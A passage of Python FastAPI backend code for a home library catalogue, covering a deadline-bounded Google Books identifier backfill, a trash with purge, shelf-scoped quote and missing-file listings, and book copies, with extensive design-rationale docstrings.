#: fifteen per member nothing waits, and where occupancy does empty the pool no
#: value of this constant saves it.
#:
#: **This figure exists because the fan out runs inside the request.** Move it
#: to a background job and this constant is deleted rather than retuned, while
#: `_BACKFILL_LOOKUPS_AT_ONCE` and the cursor both survive unchanged.
IDENTIFIER_BACKFILL_DEADLINE_SECONDS: Final = 30

#: The four outcomes `IdentifierBackfillOut` counts, as the backfill's own walk
#: labels one book.
#:
#: **A `Literal` rather than four bare strings, because the invariant is
#: published.** `IdentifierBackfillOut`'s docstring promises that `examined` is
#: the sum of these four, and the run counts them with `list.count`, so a typo in
#: one of the four calls returned 0 for that outcome, broke the promised
#: arithmetic on the wire and reported a smaller `examined`, with nothing at all
#: to say so. Against this alias `count` takes a `_Bucket | None` and mypy refuses
#: the typo.
#:
#: **It does not cover the fifth site**, `"enriched" in buckets`, which decides
#: whether to commit: `list.__contains__` takes `object`, so a typo there type
#: checks. What catches that one is behaviour rather than a type, and loudly:
#: nothing is committed, so every arm that presses twice and expects the second
#: press to examine nothing fails.
#:
#: Not an enum, which is what `enums.py` is for: these four are read only by the
#: handler that writes them, and a name in that module is a name the schema layer
#: and the migrations can reach.
_Bucket = Literal["enriched", "not_found", "unavailable", "unresolvable"]


def _resolvable_volume_id(book: Book) -> str | None:
    """This Book's Google volume id, where it carries one that may be asked about.

    **Read off the relationship rather than queried.** `book_identifiers` is a
    book-owned table with no viewer of its own, so a query over it is the shape
    `tests/test_shelf.py`'s fourth pass exists to report; a relationship read on
    a Book that came from a Shelf is scoped by construction, which is that
    docstring's own distinction. The cost is one statement per Book, and it is
    paid on a path that is about to make one HTTP request per Book.

    **Compared against the enum member without coercing the stored value.**
    `identifiers.add_identifiers` coerces both sides because it builds a key that
    has to be canonical; this is a filter for one known member, and
    `BookIdentifierScheme` is a `StrEnum`, so the comparison is exact. Coercing
    here would raise `ValueError` on a scheme this build does not know, on the
    path that enriches a book, and a row `backup.restore` wrote through Core is
    where such a value would come from.

    **`is_a_volume_id`, and what it buys is a count rather than a refusal.**
    `metadata.lookup_volume` refuses the same values, so removing this check
    would not send one anywhere: a design critic measured that, deleting it and
    running the whole backend suite green. What it buys is that an unresolvable
    row is reported as `unresolvable` rather than as Google having no such
    volume, which is the difference between "this identifier is not one" and
    "Google says no", and it saves the semaphore slot the refusal would occupy.
    Both are observable, so `test_an_unresolvable_identifier_is_counted_apart`
    fails if this goes.

    **It does not keep such a row out of `remaining`**, and a docstring here
    claimed it did. The candidate query narrows on carrying a `google_books`
    identifier and cannot narrow on its shape, so the count includes rows this
    returns None for; the cursor clears them on the pass that examines them.
    """
    for row in book.identifiers:
        if (
            row.scheme == BookIdentifierScheme.GOOGLE_BOOKS
            and google_books.is_a_volume_id(row.value)
        ):
            return row.value
    return None


@router.post("/identifiers/backfill", response_model=IdentifierBackfillOut)
async def backfill_from_identifiers(
    db: DbSession,
    current_user: CurrentUser,
    after_id: Annotated[
        int,
        Query(
            ge=0,
            # Bounded above for `backfill_covers`' reason: a Python int has no
            # ceiling and SQLite's does, so an unbounded value reaches the
            # driver and raises `OverflowError` from inside the query.
            le=2**63 - 1,
            description="Carry on past this book id. From the previous reply.",
        ),
    ] = 0,
) -> IdentifierBackfillOut:
    """Fill in books that carry a store's own identifier and no ISBN.

    **This is what a Google Play Books import needs, and nothing else supplies
    it.** That export carries a Google Books volume id for every book and no
    ISBN anywhere, so a book arrives with a title, an author and an exact key,
    and the only enrichment available to it was a search by that title. One
    volume id resolves to one record, with no ranking and no guess.

    **Amazon is deliberately absent.** Amazon publishes no catalogue API, so
    there is no request an ASIN could become. A book carrying only an ASIN is
    not a candidate here and is not reported as one.

    **Candidates are books with no ISBN, no Google volume already recorded, and
    a Google Books identifier.** No ISBN, because an ISBN
    is an exact key the free catalogues answer to, and spending a metered
    request on one would be the bill for nothing that
    `sources.Plan.lookup_together` refuses. No volume recorded, because that
    column is what enrichment from Google writes, so a book that has been
    enriched stops being a candidate and this is safe to run twice.

    **Scoped to the books the caller can see**, like the cover backfill and for
    that route's stated reason: `visible_to` has no admin bypass, so each member
    repairs their own shelf rather than the privacy rule being bent to make an
    operator action work.

    **Refuses with 409 when this library does not ask Google Books**, rather
    than examining nothing and reporting a clean run. The cause is a switch and
    a key in Settings, and the reply names both.

    Batched and resumable. `next_after_id` carries on past what this run
    examined, and comes back as 0 at the end of the library so pressing again
    starts over and re-tries whatever has since become resolvable.

    **Bounded in wall clock as well as in books**, so a slow or busy Google
    leaves the batch short rather than holding the request open. A short run
    answers with whatever resolved, counts only the books it has an outcome for,
    and moves the cursor over exactly those, so pressing again resumes at the
    first book this one did not reach. The reply does not distinguish a short run
    from a complete one and does not need to: press again while `remaining` is
    above zero.
    """
    # Charges the batch's own limiter and refuses unless Google Books is asked,
    # both behind the constructor. Holding one of these means the answer was yes.
    google = catalogue_access.GoogleVolumes.for_a_batch_backfill(
        db, member=current_user.username
    )

    # `Book.identifiers.any(...)` is a correlated EXISTS over `books` rather
    # than a second table in the FROM, which is what `Shelf.where` admits: a
    # clause naming another table would compile to a cartesian product. It
    # narrows the candidate set in SQL so `remaining` is a count of books this
    # route can actually do something with.
    shelf = Shelf.seen_by(db, current_user.id).where(
        Book.id > after_id,
        Book.isbn.is_(None),
        Book.google_books_id.is_(None),
        Book.identifiers.any(
            BookIdentifier.scheme == BookIdentifierScheme.GOOGLE_BOOKS
        ),
    )
    # Paged rather than fetched whole: `total` is every candidate past the
    # cursor and the page is this batch, from one query each, where reading them
    # all to slice fifty off the front would load a library to count it.
    batch, total = shelf.page(0, MAX_IDENTIFIER_BACKFILL, Book.id.asc())

    # The id and the Book, because a Book with no resolvable identifier is
    # dropped here and the cursor still has to advance past it: it was examined,
    # it will never resolve, and leaving it out of `next_after_id` would park
    # the run on it for ever.
    pairs = [(book, _resolvable_volume_id(book)) for book in batch]

    ends = deadline.in_(IDENTIFIER_BACKFILL_DEADLINE_SECONDS)

    async def resolve(volume_id: str) -> metadata.Lookup | None:
        """One volume lookup, or `None` where no slot came free in time.

        **The deadline is spent on the acquire and nowhere else**, and the two
        spellings a reader reaches for first are both worse than no deadline.

        `deadline=` threaded down to `fetch` is the shape `authority.py` uses,
        so it is the first thing a reader of that precedent copies, and it
        **bounds nothing here**: `deadline.left` is consulted when a request
        starts, and a coroutine parked on `acquire` has not started one. It
        would leave this handler's connection checked out for as long as the
        queue is long, which is the whole reason the deadline exists, and it
        widens three signatures to do it.

        `asyncio.timeout` around the `gather` **loses the whole batch**: the
        children that already answered are unreachable through a cancelled
        gather, so nothing merges, nothing commits, the caller gets a 500, and
        up to `MAX_IDENTIFIER_BACKFILL` metered requests are spent on a cursor
        that cannot advance, so the member presses again and spends them again.

        `asyncio.wait(timeout=)` cancelling the stragglers is refused for a
        narrower reason: `for_a_batch_backfill` charges the limiter before a
        slot is sought and a cancelled Google request is already charged, so
        cancelling a lookup in flight spends a metered request for nothing.

        **Cancelling a pending acquire leaks no slot**, which is what makes this
        safe rather than hoped: `asyncio.Semaphore.acquire` restores the count
        and wakes the next waiter when its own wait is cancelled. Remove the
        timeout and a starved run holds the request and the connection open for
        as long as somebody else's batch takes.
        """
        try:
            async with asyncio.timeout(deadline.left(ends)):
                await _BACKFILL_LOOKUPS_AT_ONCE.acquire()
        except TimeoutError:
            return None
        try:
            return await google.volume(volume_id)
        finally:
            _BACKFILL_LOOKUPS_AT_ONCE.release()

    def store(book: Book, result: metadata.Lookup) -> _Bucket:
        """Fold one answer into its Book, and name the outcome it counts as."""
        if result.outcome is metadata.Outcome.NOT_FOUND:
            return "not_found"
        if not result.found or result.record is None:
            return "unavailable"
        # Bounded here rather than trusted, exactly as `enrich_book` does it:
        # this is whatever Google answered and `merge_into` writes twelve
        # columns from it.
        google_books.merge_into(
            book, _bounded_match(result.record.as_match()), overwrite=False
        )
        # **Counted unconditionally, and `IdentifierBackfillOut` carries why.**
        # A candidate has no `google_books_id`; `google_books.lookup_by_volume_id`
        # answers only for a payload whose `id` **is a volume id**, so it is
        # twelve characters and fits `GOOGLE_BOOKS_ID_MAX`; `merge_into` writes
        # it. An answered book therefore always gains a field.
        #
        # **The middle clause is the one that has to be enforced rather than
        # stated, and it was stated first.** With only a type check on the `id`,
        # a sixty character one was dropped by `BookMatch` before `merge_into`
        # saw it: nothing written, the Book still a candidate, `enriched: 1` on
        # every press for ever. Found by a design critic as the defect the
        # removal of `unchanged` had moved one layer up.
        return "enriched"

    # One bucket per book of the batch, in batch order, `None` where this run
    # learned nothing about it: no slot came free inside the deadline, or the
    # deadline cut before its wave started.
    buckets: list[_Bucket | None] = [None] * len(pairs)
    cut_short = False

    # **Waves of `IDENTIFIER_BACKFILL_CONCURRENCY` lookups, the deadline checked
    # between them, rather than one `gather` over the whole batch.** Three
    # reasons, and the first changes an answer rather than a cost.
    #
    # * `next_after_id` has to be the end of the **contiguous** examined run,
    #   and going in batch order is what makes the examined set a prefix by
    #   construction. Read off the order the semaphore woke its waiters it would
    #   rest on `asyncio.Semaphore` being FIFO, which CPython is today and
    #   promises nowhere.
    #
    #   **The prefix does not depend on FIFO. Fair progress under contention
    #   does.** A second member's six waiters sit ahead of the first member's next
    #   wave only because the wakeups are ordered; without that order, one member
    #   pressing flat out keeps all six slots occupied, since four runs in flight
    #   each want six of six, and everybody else's press resolves nothing while
    #   spending one of their own six. Bounded in damage, not in reach: a starved
    #   run answers 200, spends no metered request and leaves the cursor where it
    #   stood, so it costs the feature rather than data, and the presser's
    #   username is free under `AUTH_MODE=proxy`.
    # * One `gather` over fifty books enqueues fifty acquires at once, so a
    #   second member's run queues behind all fifty: at six at a time and
    #   `fetch.TIMEOUT_SECONDS` each that is up to 83s of slot time, longer than
    #   any deadline that fits inside the proxy's minute, so their batch would
    #   resolve approximately nothing whatever this deadline's value is. A wave
    #   never leaves more than `IDENTIFIER_BACKFILL_CONCURRENCY` pending.
    # * It is what puts a cut on a wave boundary, which is the third of
    #   `IDENTIFIER_BACKFILL_DEADLINE_SECONDS`' derivations.
    #
    # The cost, stated rather than left to be discovered: a wave's wall clock is
    # its slowest member, so idle slots appear where one gather would have kept
    # six in flight. `ceil(50 / 6)`, the nine waves `MAX_IDENTIFIER_BACKFILL`
    # models this route as, is the ceiling: a batch with unresolvable rows in it
    # runs fewer, because a wave is filled by lookup rather than by book.
    at = 0
    while at < len(pairs):
        if deadline.left(ends) <= 0:
            cut_short = True
            break
        # **A wave is six lookups, not six books**, and the difference is the
        # throughput of a library this route exists for. Sliced off `pairs`
        # instead, a wave holding k unresolvable rows ran `6 - k` requests and
        # still spent one request's latency, so a half unresolvable library
        # examined about half as many books per press inside the same deadline
        # and a wholly unresolvable one spent a wave on nothing. That is not a
        # spare case: `IdentifierBackfillOut`'s own docstring records a library
        # whose rows are all unresolvable, because the candidate query narrows on
        # carrying a `google_books` identifier and cannot narrow on its shape.
        #
        # **It costs the prefix nothing**, which is the only thing that could
        # have refused it: the span is still contiguous in batch order and still
        # walked in that order, so everything before the first book that got no
        # slot still has an outcome. What it does change is that a wave's span in
        # books is no longer six, so the nine waves `MAX_IDENTIFIER_BACKFILL`
        # models this route as is now a ceiling rather than a count.
        asked: list[tuple[int, Book, str]] = []
        while at < len(pairs) and len(asked) < IDENTIFIER_BACKFILL_CONCURRENCY:
            book, value = pairs[at]
            if value is None:
                # No request to make, so no slot to wait for: examined for free,
                # exactly as it was before this route had a deadline. Marked as
                # the walk passes it, which is what keeps the examined set
                # contiguous while the wave is filled by lookup rather than by
                # book.
                buckets[at] = "unresolvable"
            else:
                asked.append((at, book, value))
            at += 1
        # `return_exceptions` is not set, for `metadata.lookup`'s reason: every
        # source turns its own failures into an outcome, so an exception
        # escaping one is a bug worth seeing rather than a network condition to
        # absorb. **Empty needs no guard here and does under `asyncio.wait`**,
        # which raises `ValueError` on an empty set where `asyncio.gather()`
        # returns `[]`; a library whose every row is unresolvable reaches this
        # with nothing asked, and `metadata._within_deadline`'s docstring records
        # that defect shipping once.
        answers = await asyncio.gather(*(resolve(value) for _, _, value in asked))
        for (offset, book, _), answer in zip(asked, answers, strict=True):
            if answer is None:
                cut_short = True
                continue
            buckets[offset] = store(book, answer)
        if cut_short:
            break

    # The unbroken examined run, which is the only thing the cursor may clear.
    #
    # **A book past the cut that did answer is still stored**, because its
    # metered request is already paid for and `merge_into` writes
    # `google_books_id`, which takes it out of the candidate set so the next
    # press does not spend another. It is counted in no bucket, so the reply
    # understates what this run did and never overstates it.
    cleared = buckets[
        : next((at for at, bucket in enumerate(buckets) if bucket is None), len(buckets))
    ]

    if "enriched" in buckets:
        # **One commit for the batch, in a thread**, which is where this differs
        # from `enrich_book` and why. That handler is a coroutine too and
        # commits inline, because it holds one dirty Book; this holds up to
        # `MAX_IDENTIFIER_BACKFILL` of them, and a flush of fifty rows on the
        # event loop is the loop stopped for every member at once.
        # `backfill_covers` gets the same property for nothing by being `def`,
        # which FastAPI runs in a threadpool; this cannot be, because it awaits.
        #
        # `_store_cover` is deliberately not called here: it is a second fetch
        # per book at the image services, which would double this route's
        # outbound cost and put it in front of a different supplier's rate
        # limit. `POST /api/books/covers/backfill` is the route for that, it is
        # already bounded against those services, and a book this run gave a
        # `cover_url` to is a candidate for it.
        #
        # **Outside every deadline scope, and it has to stay there.**
        # `asyncio.to_thread` cannot be cancelled, which `notifications.py`
        # already records: inside a scope that expires, the await is cancelled,
        # the thread keeps committing, and `get_db` closes the session under it
        # on a connection built with `check_same_thread=False`. A test for that
        # would be flaky rather than red, which is why this is a comment.
        await asyncio.to_thread(db.commit)

    # **The books this run has an outcome for, which is not always the batch.**
    # A book with no resolvable identifier is examined for free, as before; a
    # book the deadline never got a slot for is not examined at all, and neither
    # is anything after it, so every count here is over the prefix and the four
    # still sum to `examined`, which is what keeps the wire shape unchanged.
    examined = len(cleared)
    enriched = cleared.count("enriched")
    not_found = cleared.count("not_found")
    unavailable = cleared.count("unavailable")
    unresolvable = cleared.count("unresolvable")
    remaining = total - examined
    logger.info(
        "Identifier backfill for %s: examined %d of %d, enriched %d, "
        "no such volume %d, unavailable %d, unresolvable %d, %d left%s",
        current_user.username,
        examined,
        len(batch),
        enriched,
        not_found,
        unavailable,
        unresolvable,
        remaining,
        ", cut short by the deadline" if cut_short else "",
    )
    return IdentifierBackfillOut(
        examined=examined,
        enriched=enriched,
        # **Reported apart from `not_found`, and folding them was a finding.**
        # Both are permanent, which is the argument for one number; only one of
        # them is Google's answer, which is the argument against, and the screen
        # said "Google has no record for these" about rows no request was ever
        # made for. Separating them also puts `_resolvable_volume_id`'s shape
        # check on the wire, so deleting it fails a test rather than changing a
        # log line nothing reads.
        not_found=not_found,
        unavailable=unavailable,
        unresolvable=unresolvable,
        remaining=remaining,
        # **The last book of the unbroken examined run, never the last book of
        # the batch.** `batch[-1].id` would skip every book a cut dropped for a
        # whole pass of the library, and they would come back only when the
        # cursor wrapped to 0. Where the run examined none of them it is
        # `after_id` unchanged, so the next press resumes where this one stood.
        # 0 at the end, so the next press starts over rather than answering
        # nothing for ever.
        #
        # **A cut can never report the library finished**, which is the one way
        # this could lose books: a cut means at least one book of the batch has
        # no outcome, so `examined <= len(batch) - 1 <= total - 1`, so
        # `remaining >= 1` and the cursor moves over the prefix rather than to 0.
        next_after_id=(
            (batch[examined - 1].id if examined else after_id) if remaining > 0 else 0
        ),
    )


# ── Trash ─────────────────────────────────────────────────────────────────────
#
# Deleting parks a row rather than dropping it. Three things follow from that,
# and each is somewhere a naive soft delete goes wrong.


def _trash(book: Book, db: Session) -> None:
    """Stamp the deletion, and close any loan that was open on it.

    The loan has to go with it. A trashed book leaves the loans list, which is
    deliberate, but the loan row stayed open and `PUT /api/loans/{id}/return`
    404s on a book nobody can see, so the borrower still had it and there was
    no way left to record it coming back. Closing it is the honest end: the
    book has left the catalogue, so the app is no longer tracking who has it.

    **Does not commit.** The caller does, once. Committing here made a bulk
    delete of 500 books 1001 statements and 2.08 seconds, because each commit
    expires the session and forces the next book to be re-selected, and it made
    the operation non-atomic: a crash halfway left half the selection deleted.
    """
    if book.deleted_at is not None:
        return

    now = datetime.now(UTC).replace(tzinfo=None)
    book.deleted_at = now
    # The Book is resolved and authorised by the caller, which is the scope
    # `Loans.open_on` is for. One statement, and none at all for a Book that
    # was never out.
    for loan in Loans.open_on(db, [book.id]).values():
        lending.close(loan, now)


def _purge(book: Book, db: Session) -> int:
    """Delete a trashed book for good. Returns the id whose cover files the
    caller must forget **after the commit**.

    The cover is the part a soft delete leaves behind, and it is the standing
    cost of holding covers on disk rather than in the row. Files are named by
    book id, so the next book to take that id inherits somebody else's cover,
    and since ids are reused by SQLite after the highest row goes, that is not a
    remote possibility. `_trash` deliberately does **not** do this: a trashed
    book can be restored, and restoring one to a placeholder would be a delete
    that half happened.

    **The unlink is the caller's, and it belongs after the commit.** This
    function used to do it itself, first thing, which made a file loss
    unrecoverable by any failure after it: the transaction rolls the DELETE
    back, so the member still has the book, and its `cover_url` now points at
    a file that no longer exists. Nothing logged it. Adding copies made that
    reachable through the ordinary scan flow, because one ISBN could be held by
    several trashed rows and freeing them could raise part way through. A
    `finally` would not have helped and neither would reordering: only a commit
    settles whether the row is gone, and flushing per book to get closer would
    put back the 3801 statements the "does not commit" note below exists to
    avoid.

    **Does not commit**, for that reason: emptying a trash of 500 books was
    3801 statements and 3.6 seconds of re-selecting.
    """
    book_id = book.id
    token = book.copy_group
    db.delete(book)

    # Only when this row was one of several copies, which almost none are. The
    # flush is what makes the count in `_normalise_copy_group` see the delete,
    # and paying for it on every purge would put those 3801 statements back.
    if token is not None:
        db.flush()
        _normalise_copy_group(token, db)
    return book_id


@router.get("/trash", response_model=Page[BookOut])
def list_trash(
    db: DbSession,
    current_user: CurrentUser,
    paging: Paging,
) -> Page[BookOut]:
    """What this member has deleted and could still put back.

    Declared before `/{book_id}`, like `/export`: FastAPI matches in
    declaration order, so the reverse would make this a request for the book
    with id "trash".

    Most recently deleted first. The trash is read to find something just lost,
    not to browse a history.
    """
    books, total = Shelf.trashed_by(db, current_user.id).page(
        paging.offset,
        paging.limit,
        Book.deleted_at.desc(),
        Book.id.desc(),
        load=Loading.SERIALISED,
    )
    return Page[BookOut](
        items=books_to_out(books, current_user, db),
        total=total,
        page=paging.page,
        page_size=paging.page_size,
    )


@router.get("/quotes", response_model=Page[QuoteWithBookOut])
def list_quotes(
    db: DbSession,
    current_user: CurrentUser,
    paging: Paging,
) -> Page[QuoteWithBookOut]:
    """Every passage the caller may see, from every book.

    Declared before `/{book_id}`, like `/trash` and `/export`: FastAPI matches
    in declaration order, so the reverse would make this a request for the book
    with id "quotes".

    **This is a book query wearing a different hat**, so both halves of it are
    rooted at the shelf and joined outward to `quotes`. Without that a quote
    from somebody else's private book would be listed here with its title and
    cover, which discloses the book, the passage and that the member owns it,
    in one 200. The count is scoped for the same reason: an unfiltered total
    announces how many are hidden.

    The count used to be spelled `count(Book.id)` rather than `count(Quote.id)`
    so that the AST guard could see it was a book query at all. That guard is
    gone and the spelling now carries no such weight, but it is left alone
    because the two are identical over an inner join on a primary key and
    changing it would be a diff with no reader.

    Newest first. A book's own quotes come back in reading order because a book
    has one; a list spanning the shelf does not, and the interesting end of it
    is the one somebody just added.

    Joined to the book rather than fetching one per row: a hundred quotes over
    ninety books is ninety extra statements, which is the N+1 `_books_to_out`
    exists to avoid.
    """
    # `count(Book.id)`, not `count(Quote.id)`. The two are identical here: an
    # inner join, and `Book.id` is a primary key that is never null.
    #
    # The spelling used to be load bearing. `TestEveryBookQueryIsFiltered`
    # recognised a book query by the arguments to `query()`, so `count(Quote.id)`
    # put this statement outside the guard entirely, and dropping its filter was
    # measured to produce no offender. That guard is gone, and both halves below
    # are rooted at the shelf instead, so nothing now depends on which column is
    # counted. Left alone because a count of visible books is what this is.
    shelf = Shelf.seen_by(db, current_user.id)

    total = (
        shelf.select(func.count(Book.id)).join(Quote, Quote.book_id == Book.id).scalar() or 0
    )

    rows = (
        shelf.select(Quote, Book.title, Book.author, Book.cover_url)
        .join(Quote, Quote.book_id == Book.id)
        .options(joinedload(Quote.author))
        .order_by(Quote.created_at.desc(), Quote.id.desc())
        .offset(paging.offset)
        .limit(paging.limit)
        .all()
    )

    return Page[QuoteWithBookOut](
        items=[
            QuoteWithBookOut(
                **QuoteOut.model_validate(quote).model_dump(),
                book_title=title,
                book_author=author,
                book_cover_url=cover_url,
            )
            for quote, title, author, cover_url in rows
        ],
        total=total,
        page=paging.page,
        page_size=paging.page_size,
    )


@router.delete("/trash", response_model=PurgeResult)
def empty_trash(db: DbSession, current_user: CurrentUser) -> PurgeResult:
    """Delete everything in the caller's trash for good.

    Scoped by `in_trash_for`, so emptying the trash never reaches a book the
    caller could not see in it. There is no automatic expiry: this app has no
    scheduler, and a sweep at startup would delete on restart timing rather
    than on any schedule anybody chose.
    """
    books = Shelf.trashed_by(db, current_user.id).all()
    purged = [_purge(book, db) for book in books]
    db.commit()
    # After the commit. See `_purge`: an unlink before it is a file loss no
    # rollback undoes.
    for book_id in purged:
        cover_store.remove(book_id)
    return PurgeResult(purged=len(purged))


# ── Files reported missing, across the shelf ──────────────────────────────────
#
# The one digital-reference route that is not per book. Its four siblings are
# in their own section far below, beside the writes they belong with; this one
# is **here**, on this side of the `/{book_id}` boundary, because FastAPI
# matches in declaration order and a two segment path is not what saves it: the
# day somebody declares `/{book_id}/missing` above, a request for this listing
# becomes a request for the book with id "digital-references". Declared with
# `/quotes`, `/trash` and `/export` for that reason.


@router.get(
    "/digital-references/missing", response_model=Page[MissingDigitalReferenceOut]
)
def list_missing_digital_references(
    db: DbSession,
    current_user: CurrentUser,
    paging: Paging,
) -> Page[MissingDigitalReferenceOut]:
    """Every file the caller can see that a client looked for and did not find.

    The reader for `missing_since`. Without it the flag is answerable only one
    book at a time, so finding every flagged file is one request per book across
    the whole catalogue, and almost every book holds none.

    **Scoped by the Shelf and by nothing else, which is the table's own rule
    rather than a choice made here**: a reference is an ordinary field on a Book
    and carries no Member of its own, so its visibility is the Book's entirely.
    `models.DigitalReference` says that at the column, and it is why there is no
    `added_by_user_id` to scope by.

    **A narrower scope was written first and removed, and the reason is worth
    keeping.** The arm was `Book.added_by_user_id == current_user.id`, meant to
    give a member their own references and nobody else's. It cannot: any member
    who may read a Book may report a file on it, so the row's reporter is not
    the Book's adder and is recorded nowhere. That arm hid a member's own misses
    on Books somebody else added, which is the ordinary household case and the
    feature's main one, while still showing another member's paths on Books the
    caller added. A filter whose key is not the thing its reason names is not a
    narrowing, and "my own references" needs a reporter column on the table,
    which is a migration and not this route.

    **So say plainly what a row discloses**, since nothing here prevents it: a
    reference is `root_label` plus `relative_path`, an unverified path on
    somebody's machine, and the flag adds that a client could not reach it. This
    listing hands the caller every such row on the shelf they can see in one
    request, where reading them per book is one request each. It is the same
    disclosure at a different price, because a Book the caller cannot see is not
    on this shelf and its references are unreachable here as they are anywhere
    else.

    Rows are references, not books, and that is the decision this route makes
    rather than discovers. The flag is per location: a book at three paths with
    one gone is not a missing book, and a listing of books cannot say which of
    the three to go and look at. "Which of my books have gone missing" is read
    off the book column here; the reverse needs a request per book, which is the
    cost this route exists to remove.

    Newest miss first. A miss reported minutes ago is the one whose cause a
    member can still name (a drive unplugged, a folder moved this morning), and
    a client sweeping a directory posts its misses in one burst, so the burst
    arrives as a block rather than scattered down the tail. **Tied on the id**,
    because that burst shares one `CURRENT_TIMESTAMP` value: without the
    tiebreak two pages of one burst can repeat a row and drop another.

    Trashed books are absent, and that falls out of `Shelf.seen_by` rather than
    being a clause here.

    The total counts references, like the rows: a member with one book at three
    missing locations has three. It is scoped for the reason the quotes listing
    scopes its own, since an unscoped total announces how many rows are hidden.
    """
    shelf = Shelf.seen_by(db, current_user.id)
    flagged = DigitalReference.missing_since.isnot(None)

    total = (
        shelf.select(func.count(DigitalReference.id))
        .join(DigitalReference, DigitalReference.book_id == Book.id)
        .filter(flagged)
        .scalar()
        or 0
    )

    rows = (
        shelf.select(DigitalReference, Book.title, Book.author, Book.cover_url)
        .join(DigitalReference, DigitalReference.book_id == Book.id)
        .filter(flagged)
        .order_by(DigitalReference.missing_since.desc(), DigitalReference.id.desc())
        .offset(paging.offset)
        .limit(paging.limit)
        .all()
    )

    return Page[MissingDigitalReferenceOut](
        items=[
            MissingDigitalReferenceOut(
                **DigitalReferenceOut.model_validate(reference).model_dump(),
                book_title=title,
                book_author=author,
                book_cover_url=cover_url,
            )
            for reference, title, author, cover_url in rows
        ],
        total=total,
        page=paging.page,
        page_size=paging.page_size,
    )


# ── Single book ───────────────────────────────────────────────────────────────


@router.get("/{book_id}", response_model=BookOut)
def get_book(book: BookForRead, db: DbSession, current_user: CurrentUser) -> BookOut:
    return book_to_out(book, current_user, db)


# ── Copies ────────────────────────────────────────────────────────────────────
#
# A library that holds two paperbacks of one title owns two objects, and every
# per-object fact in `books` (location, condition, what was paid, who has it)
# is already written per row. So a copy is a second row, joined to the first by
# a shared `copy_group`.
#
# That token is the whole distinction between a copy and a duplicate. Two rows
# with no group that name the same book are an accident, refused by
# `uq_books_isbn_single_copy` and offered to `/duplicates` to merge. Two rows
# sharing a group are a deliberate statement by somebody who pressed a button
# that said "add another copy", and neither the index nor the duplicate finder
# touches them.

#: Facts about the **work**, which every copy of it shares. Taken from the book
#: being copied rather than accepted from the caller: a payload that can restate
#: them is a payload that can disagree with them, and two rows claiming to be
#: copies of each other while naming different books is a state nothing else in
#: this app knows how to render.
#:
#: Which columns those are is `book_columns`', not this route's: a tuple written
#: out here would relate to `Book` through nothing, and that module refuses to
#: import when a column of `books` is classified nowhere. `cover_url` is absent
#: there too and handled separately here, because a cover this app holds is a
#: file named by book id: see the note in the handler.
#:
#: **A local name rather than the import at the call site**, because
#: `enums.BookIdentifierScheme.GOOGLE_BOOKS` names this one in prose and that
#: docstring is the column's description in `openapi.json`. Spelling it away is
#: a client regeneration.
_WORK_FIELDS: Final = book_columns.WORK_FACTS


@router.get("/{book_id}/copies", response_model=list[BookOut])
def list_copies(book: BookForRead, db: DbSession, current_user: CurrentUser) -> list[BookOut]:
    """Every copy of this title the caller may see, this one included.

    A one-element list for almost every book in the catalogue, and that is the
    honest answer rather than an empty one: the book in hand is a copy, it is
    just the only one.

    Ordered by id, which is the order they were added. There is no first copy
    in the data model and this does not invent one; it is the order that stays
    the same between two reads.
    """
    if book.copy_group is None:
        return [book_to_out(book, current_user, db)]

    copies = (
        Shelf.seen_by(db, current_user.id)
        .where(Book.copy_group == book.copy_group)
        .all(Book.id.asc(), load=Loading.SERIALISED)
    )
    return books_to_out(copies, current_user, db)


@router.post(
    "/{book_id}/copies", response_model=BookOut, status_code=status.HTTP_201_CREATED
)
def add_copy(
    payload: CopyCreate,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Record that the library holds another copy of this book.

    The deliberate half of the ISBN collision. Scanning a book already on the
    shelf answers 409 exactly as it always has, because the overwhelmingly
    common reason for it is a second pass through the same bookcase; this
    endpoint is the other reason, and it is reached by pressing something that
    says so rather than by the app guessing.

    **`is_private` is inherited, never chosen here.** A copy of a private book
    that came back public would disclose the book. The caller added the copy,
    so they are its owner and `PATCH /{id}/privacy` can change it afterwards.

    **Reading state is not copied.** Status, rating, progress, notes, quotes
    and loans all belong to a person and an object, and the new object is one
    nobody has read yet. Tags are copied: they describe the work, and
    re-picking six of them for a second paperback is exactly the friction this
    feature exists to remove.
    """
    _checked_collection(db, payload.collection_id, current_user.id)

    if book.copy_group is None:
        book.copy_group = copy_group_token()

    copy = Book(
        **{field: getattr(book, field) for field in _WORK_FIELDS},
        **payload.model_dump(),
        copy_group=book.copy_group,
        is_private=book.is_private,
        added_by_user_id=current_user.id,
        # Somebody adding a copy is holding it, which is the same reason
        # `ownership` defaults to OWNED on a scan.
        ownership=OwnershipStatus.OWNED,
    )
    copy.tags = list(book.tags)
    db.add(copy)
    db.commit()
    db.refresh(copy)

    # After the insert, because a stored cover is a file named by the book's
    # id and the id does not exist until the row does. The file is **copied,
    # not shared**: `cover_store.remove` deletes by id, so two rows pointing at one
    # file would mean purging either copy blanks the other's cover.
    if covers.is_local(book.cover_url):
        copied = covers.duplicate(copy.id, book.id)
        if copied is not None:
            copy.cover_url = copied
            db.commit()
            db.refresh(copy)
    else:
        # A remote URL, or none at all. Either way this is the same work every
        # other add path does: resolve the best cover available and hold it.
        copy.cover_url = book.cover_url
        if _store_cover(copy):
            db.commit()
            db.refresh(copy)

    return book_to_out(copy, current_user, db)


def _normalise_copy_group(token: str | None, db: Session) -> None:
    """Clear a copy group that has shrunk back to a single row.

    Called after rows are destroyed, never after they are trashed: a trashed
    copy can be restored, and a group cleared underneath it would leave two
    rows that used to be copies of each other with no token and the same ISBN,
    which is precisely what `uq_books_isbn_single_copy` refuses. The restore
    would fail, on a button that has nothing to do with copies.

    Clearing matters because the token is what suspends the unique index for
    that ISBN. A group of one is a book like any other and should be exclusive
    again.

    **Refuses to clear when another ungrouped row already holds the ISBN.**
    Nothing in the app can produce that state (`_create_book` answers 409 on
    any row with the ISBN, grouped or not), but a hand-edited or restored
    database can, and the cost of being wrong is an IntegrityError raised from
    inside somebody's delete.
    """
    if token is None:
        return
    # `whole_table_for_uniqueness`, not a shelf: this is the uniqueness rule,
    # which spans the whole table. A group counted per member would clear a
    # token another member's private copy still needs, and the index does not
    # care who can see a row.
    remaining = whole_table_for_uniqueness(db).filter(Book.copy_group == token).all()
    if len(remaining) != 1:
        return
    survivor = remaining[0]
    if survivor.isbn is not None:
        # Same rule, same reason as above.
        clash = (
            whole_table_for_uniqueness(db, Book.id)
            .filter(
                Book.isbn == survivor.isbn,
                Book.copy_group.is_(None),
                Book.id != survivor.id,
            )
            .first()
        )
        if clash is not None:
            return
    survivor.copy_group = None


